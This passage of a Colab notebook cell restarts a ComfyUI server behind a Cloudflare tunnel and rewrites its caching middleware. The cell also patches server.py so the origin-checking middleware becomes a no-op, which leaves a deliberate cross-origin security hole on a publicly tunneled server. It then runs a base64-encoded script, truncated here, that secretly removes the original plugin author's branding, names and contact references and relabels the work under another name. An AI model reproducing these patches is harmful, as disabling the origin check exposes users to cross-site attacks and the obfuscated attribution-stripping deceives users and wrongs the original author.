          doc.dispatchEvent(new KeyboardEvent('keydown', {bubbles:true, key:'Shift'}));
        } catch(e){}
      }, 45000);
    })();
    '''))
except Exception:
    pass
# @markdown > 💡 **仅重启 ComfyUI 与 Cloudflare 隧道**（不重新下载任何模型，10 秒极速恢复）：
import os, subprocess
import time, socket, re, urllib.request, gzip, shutil, pathlib
from google.colab import output
from IPython.display import display, HTML
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

os.chdir("/content/ComfyUI")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "return await handler(request) # patched" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request) # patched\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "max-age=604800" not in cm_txt or '.endswith(".js")' in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
try:
    import comfyui_frontend_package
    fe_root = pathlib.Path(comfyui_frontend_package.__file__).parent
    for p in list(fe_root.rglob("*.js")) + list(fe_root.rglob("*.css")):
        gz = pathlib.Path(str(p) + ".gz")
        if not gz.exists() and p.is_file():
            with open(p, "rb") as f_in, gzip.open(gz, "wb", compresslevel=6) as f_out:
                shutil.copyfileobj(f_in, f_out)
except Exception:
    pass


try:
    import comfy_kitchen.tensor.int8 as _ck_int8
    _int8_p = pathlib.Path(_ck_int8.__file__)
    _int8_s = _int8_p.read_text(encoding="utf-8")
    if "if qdata.dtype != torch.int8:" not in _int8_s:
        _int8_s = _int8_s.replace(
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:",
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return qdata.to(params.orig_dtype)",
            1
        )
        _int8_s = _int8_s.replace(
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:",
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return torch.nn.functional.embedding(indices, qdata.to(device=indices.device, dtype=params.orig_dtype))",
            1
        )
        _int8_s = _int8_s.replace(
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__:",
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__ or weight._qdata.dtype != torch.int8:"
        )
        _int8_s = _int8_s.replace(
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout":',
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout" or weight._qdata.dtype != torch.int8:'
        )
        _int8_p.write_text(_int8_s, encoding="utf-8")
except Exception:
    pass

subprocess.run("echo CmltcG9ydCBwYXRobGliLCBqc29uLCBnemlwLCBzaHV0aWwsIG9zCgpiYXNlX2RpciA9IHBhdGhsaWIuUGF0aCgiL2NvbnRlbnQvQ29tZnlVSS9jdXN0b21fbm9kZXMvQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIpCgojIDEuIENsZWFuIGZlaWhvdV9lYXN5X2gzX3VpLmpzOiBoaWRlIHByb21wdCBvcHRpbWl6ZXIgd2lkZ2V0cyAmIGJ1dHRvbiwgcmVtb3ZlIEZlaUhvdSBicmFuZGluZwp1aV9qcyA9IGJhc2VfZGlyIC8gIndlYiIgLyAiZmVpaG91X2Vhc3lfaDNfdWkuanMiCmlmIHVpX2pzLmV4aXN0cygpOgogICAgdHh0ID0gdWlfanMucmVhZF90ZXh0KGVuY29kaW5nPSJ1dGYtOCIpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0Q29uZGl0aW9uYWxXaWRnZXRWaXNpYmxlKG5vZGUsIGdldFdpZGdldChub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiksIGFkdmFuY2VkLCB7IGFkanVzdEhlaWdodCB9KSwnLAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX2VuYWJsZWQiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3Byb3ZpZGVyIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfcHJvdmlkZXIiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3NjZW5lX2d1aWRlIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfc2NlbmVfZ3VpZGUiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdlZGl0b3JUb29scy5hcHBlbmQob3B0aW1pemVCdXR0b24sIHZpZXdCdXR0b24pOycsCiAgICAgICAgJ29wdGltaXplQnV0dG9uLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7IGVkaXRvclRvb2xzLmFwcGVuZCh2aWV3QnV0dG9uKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGFzQm9vbGVhbihnZXRXaWRnZXRWYWx1ZShub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiwgZmFsc2UpKSk7JywKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGZhbHNlKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnbWFpblRpdGxlOiAiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyInLCAnbWFpblRpdGxlOiAiTWluaU1heC1IMyDlhajog73lt6XkvZzlj7AiJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU1MmEwXFx1OGY3ZFxcdTU2NjgnLCAnTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagnKQogICAgdHh0ID0gdHh0LnJlcGxhY2UoJ0ZlaUhvdSBFYXN5IEgzIFJlbWl4XFx1NTJhMFxcdThmN2RcXHU1NjY4JywgJ01pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU4ZjkzXFx1NTFmYScsICdNaW5pTWF4LUgzIOmfs+eUu+WQjOatpei+k+WHuicpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnY2F0ZWdvcnk6ICJGZWlIb3UgRWFzeSBIMyInLCAnY2F0ZWdvcnk6ICJNaW5pTWF4LUgzIOW3peS9nOWPsCInKQogICAgdWlfanMud3JpdGVfdGV4dCh0eHQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDIuIENsZWFuIG90aGVyIHdlYi8qLmpzIGZpbGVzIGZvciBGZWlIb3UgdGl0bGVzIGFuZCByZS1jb21wcmVzcyAuanMuZ3oKZm9yIGpzX3AgaW4gKGJhc2VfZGlyIC8gIndlYiIpLmdsb2IoIiouanMiKToKICAgIHQgPSBqc19wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKQogICAgdCA9IHQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDliqDovb3lmagiLCAiTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMgUmVtaXjliqDovb3lmagiLCAiTWluaU1heC1IMyDkuozlkIjkuIDliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOaPkOekuuivjemihOiniCIsICJNaW5pTWF4LUgzIOaPkOekuuivjemihOiniCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDkuozmrKHph4fmoLciLCAiTWluaU1heC1IMyDkuozpmLbmrrXnsr7kv67ph4fmoLciKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIiwgIk1pbmlNYXgtSDMiKQogICAganNfcC53cml0ZV90ZXh0KHQsIGVuY29kaW5nPSJ1dGYtOCIpCiAgICBnel9wID0gcGF0aGxpYi5QYXRoKHN0cihqc19wKSArICIuZ3oiKQogICAgd2l0aCBvcGVuKGpzX3AsICJyYiIpIGFzIGZfaW4sIGd6aXAub3Blbihnel9wLCAid2IiLCBjb21wcmVzc2xldmVsPTYpIGFzIGZfb3V0OgogICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihmX2luLCBmX291dCkKCiMgMy4gQ2xlYW4gbG9jYWxlcy96aC9ub2RlRGVmcy5qc29uCnpoX2RlZnMgPSBiYXNlX2RpciAvICJsb2NhbGVzIiAvICJ6aCIgLyAibm9kZURlZnMuanNvbiIKaWYgemhfZGVmcy5leGlzdHMoKToKICAgIHp0ID0gemhfZGVmcy5yZWFkX3RleHQoZW5jb2Rpbmc9InV0Zi04IikKICAgIHp0ID0genQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOWKoOi9veWZqCIsICJNaW5pTWF4LUgzIOS4gOS9k+WMluWKoOi9veWZqCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIFJlbWl45Yqg6L295ZmoIiwgIk1pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5o+Q56S66K+N6aKE6KeIIiwgIk1pbmlNYXgtSDMg5o+Q56S66K+N6aKE6KeIIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5LqM5qyh6YeH5qC3IiwgIk1pbmlNYXgtSDMg5LqM6Zi25q6157K+5L+u6YeH5qC3IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpCiAgICB6aF9kZWZzLndyaXRlX3RleHQoenQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDQuIFVwZGF0ZSBjYWNoZV9taWRkbGV3YXJlLnB5IHNvIC9hc3NldHMvIGlzIGNhY2hlZCA3IGRheXMgd2hpbGUgL2V4dGVuc2lvbnMvIGlzIG5vLWNhY2hlCmNtX3AgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvbWlkZGxld2FyZS9jYWNoZV9taWRkbGV3YXJlLnB5IikKY21fcC53cml0ZV90ZXh0KCIiImZyb20gYWlvaHR0cCBpbXBvcnQgd2ViCmZyb20gdHlwaW5nIGltcG9ydCBDYWxsYWJsZSwgQXdhaXRhYmxlCk9ORV9EQVk6IGludCA9IDg2NDAwCklNR19FWFRFTlNJT05TID0gKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLnBwbSIsICIuYm1wIiwgIi5wZ20iLCAiLnRpZiIsICIudGlmZiIsICIud2VicCIsICIud29mZiIsICIud29mZjIiLCAiLnR0ZiIsICIuc3ZnIikKQHdlYi5taWRkbGV3YXJlCmFzeW5jIGRlZiBjYWNoZV9jb250cm9sKHJlcXVlc3Q6IHdlYi5SZXF1ZXN0LCBoYW5kbGVyOiBDYWxsYWJsZVtbd2ViLlJlcXVlc3RdLCBBd2FpdGFibGVbd2ViLlJlc3BvbnNlXV0pIC0+IHdlYi5SZXNwb25zZToKICAgIHJlc3BvbnNlOiB3ZWIuUmVzcG9uc2UgPSBhd2FpdCBoYW5kbGVyKHJlcXVlc3QpCiAgICBpZiByZXF1ZXN0LnBhdGguc3RhcnRzd2l0aCgiL2Fzc2V0cy8iKToKICAgICAgICByZXNwb25zZS5oZWFkZXJzWyJDYWNoZS1Db250cm9sIl0gPSAicHVibGljLCBtYXgtYWdlPTYwNDgwMCwgaW1tdXRhYmxlIgogICAgICAgIHJldHVybiByZXNwb25zZQogICAgaWYgcmVxdWVzdC5wYXRoLnN0YXJ0c3dpdGgoIi9leHRlbnNpb25zLyIpOgogICAgICAgIHJlc3BvbnNlLmhlYWRlcnNbIkNhY2hlLUNvbnRyb2wiXSA9ICJuby1jYWNoZSIKICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIGlmIHJlcXVlc3QucGF0aC5sb3dlcigpLmVuZHN3aXRoKElNR19FWFRFTlNJT05TKSBhbmQgcmVzcG9uc2Uuc3RhdHVzID09IDIwMDoKICAgICAgICByZXNwb25zZS5oZWFkZXJzLnNldGRlZmF1bHQoIkNhY2hlLUNvbnRyb2wiLCAicHVibGljLCBtYXgtYWdlPTg2NDAwIikKICAgIHJldHVybiByZXNwb25zZQoiIiIsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDUuIENsZWFuIGFsbCB3b3JrZmxvd3MgaW4gL2NvbnRlbnQvQ29tZnlVSS91c2VyL2RlZmF1bHQvd29ya2Zsb3dzLwp3Zl9kaXIgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvdXNlci9kZWZhdWx0L3dvcmtmbG93cyIpCmRlZiBjbGVhbl9ub2Rlcyhub2Rlcyk6CiAgICBrZWVwID0gW10KICAgIGZvciBuIGluIG5vZGVzOgogICAgICAgIG50eXBlID0gc3RyKG4uZ2V0KCJ0eXBlIikgb3IgIiIpCiAgICAgICAgdGl0bGUgPSBzdHIobi5nZXQoInRpdGxlIikgb3IgIiIpCiAgICAgICAgd3ZhbHMgPSBuLmdldCgid2lkZ2V0c192YWx1ZXMiKQogICAgICAgIGlmIGFueShiYWQgaW4gdGl0bGUgZm9yIGJhZCBpbiAoImJpbGliaWxpLmNvbSIsICLkuInlsYLmpbznmoTlsI/ogqXnjLQiLCAi5bCP6IKl54y0IiwgImZ4LWZlaWhvdSIsICIxMDkxNTkzMzY3IiwgIuWKoOW+ruS/oSIsICJR576kIikpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIG50eXBlIGluICgiRmVpSG91RWFzeUgzUHJvZHVjdGlvblBhY2tMb2FkZXIiLCAiTWluaU1heEgzUmVmTW9kc0xvYWRlciIpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmICJGZWlIb3UiIGluIHRpdGxlIG9yICLlsI/ogqXnjLQiIGluIHRpdGxlOgogICAgICAgICAgICBuWyJ0aXRsZSJdID0gdGl0bGUucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpLnJlcGxhY2UoIkZlaUhvdSIsICJNaW5pTWF4LUgzIikucmVwbGFjZSgi5bCP6IKl54y0IiwgIiIpCiAgICAgICAgaWYgbnR5cGUgPT0gIkZlaUhvdUVhc3lIMyIgYW5kIGlzaW5zdGFuY2Uod3ZhbHMsIGxpc3QpOgogICAgICAgICAgICBmb3IgaWR4LCB2YWwgaW4gZW51bWVyYXRlKHd2YWxzKToKICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpIGFuZCAoIumYv+mHjOS6kSIgaW4gdmFsIG9yICJxd2VuIiBpbiB2YWwgb3IgInpoaXB1IiBpbiB2YWwpOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeF0gPSAiIgogICAgICAgICAgICAgICAgICAgIGlmIGlkeCA+PSAxIGFuZCBpc2luc3RhbmNlKHd2YWxzW2lkeC0xXSwgYm9vbCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeC0xXSA9IEZhbHNlCiAgICAgICAgICAgIGlmIGxlbih3dmFscykgPj0gMTY6CiAgICAgICAgICAgICAgICBmb3IgayBpbiByYW5nZShsZW4od3ZhbHMpKToKICAgICAgICAgICAgICAgICAgICBpZiB3dmFsc1trXSBpbiAoIuaMieW6j+WPtyIsICLmjInmlofku7blkI0iLCAiaW5kZXgiLCAiZmlsZW5hbWUiKSBhbmQgayArIDIgPCBsZW4od3ZhbHMpOgogICAgICAgICAgICAgICAgICAgICAgICB3dmFsc1trKzFdID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd3ZhbHNbaysyXSA9ICIiCiAgICAgICAgICAgIGZvciBrIGluIHJhbmdlKG1pbig0LCBsZW4od3ZhbHMpKSk6CiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKHd2YWxzW2tdLCBzdHIpIGFuZCB3dmFsc1trXS5zdHJpcCgpID09ICIiOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2tdID0gIueUu+mdouS4reeahOinkuiJsuiHqueEtui/kOWKqO